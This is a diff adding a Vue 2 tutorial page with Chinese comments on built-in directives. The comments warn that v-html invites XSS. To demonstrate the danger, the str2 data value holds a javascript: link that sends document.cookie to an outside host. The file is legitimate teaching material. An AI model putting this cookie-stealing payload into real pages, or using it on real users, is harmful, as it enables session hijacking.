@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>内置指令</title>
+  <!-- IMPORT Vue -->
+  <script src="../js/vue.js"></script>
+  <script src="../js/dayjs.min.js"></script>
+</head>
+<style>
+  #root {
+    width: 300px;
+    padding: 10px;
+    background: #ccc;
+    margin: 0 auto;
+    margin-top: 100px;
+  }
+  [v-cloak] {
+    display: none;
+  }
+</style>
+
+<body>
+  <!-- 
+    v-bind：单向绑定，可简写为 :xxx
+    v-model：双向绑定
+    v-for：遍历数组、对象、字符串
+    v-on：事件绑定，可简写为 @xxx
+    V-if：条件渲染
+    v-else：条件渲染
+    v-show：条件渲染
+    v-text：
+      1.作用：向其所在的节点中渲染文本内容
+      2.与插值语法的区别：v-text会替换掉节点中的内容，{{xxx}}则不会
+    v-html：
+      1.作用：向指定节点中渲染包含html结构的内容
+      2.与插值语法的区别：
+        1.v-html会替换掉节点中的内容，{{xxx}}则不会
+        2.v-html可以渲染html结构
+      3.严重注意：v-html有安全性问题
+        1.在网站上动态渲染任意HTML内容，可能会导致XSS攻击
+        2.一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上
+    v-cloak(没有值)：
+      1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
+      2.使用css配合v-cloak使用，可以解决网速慢时页面展示出{{xxx}}的问题
+    v-once：
+      1.v-once所在节点在初次动态渲染后，就视为静态内容了。
+      2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
+    v-pre：
+      1.跳过其所在节点的编译过程
+      2.可利用它跳过：没用使用指令语法、没有使用插值语法的节点，可以节省编译时间
+   -->
+  <!-- 准备好一个容器 -->
+  <div id="root">
+    <div>exp:{{str}}</div>
+    <div v-text="str">exp:{{str}}</div>
+    <div v-html="str2">exp:{{str}}</div>
+    <div v-cloak>exp:{{str}}</div>
+    <div v-once>origin：n = {{n}}</div>
+    <div >now：n = {{n}}</div>
+    <button @click="n++">n++</button>
+    <!--  -->
+    <div v-pre v-once>origin：n = {{n}}</div>
+    <div v-pre>now：n = {{n}}</div>
+    <button @click="n++">n++</button>
+  </div>
+
+  <!-- IMPROT JS -->
+  <script>
+    Vue.config.productionTip = false; // 阻止 vue 在启动时生成生产提示
+
+    const vm = new Vue({
+      el: '#root',
+      data: {
+        n: 1,
+        str: '<h3>Hello World</h3>',
+        str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>Hello World</a>'
+      },
+    })
+  </script>
+</body>
+
+</html>
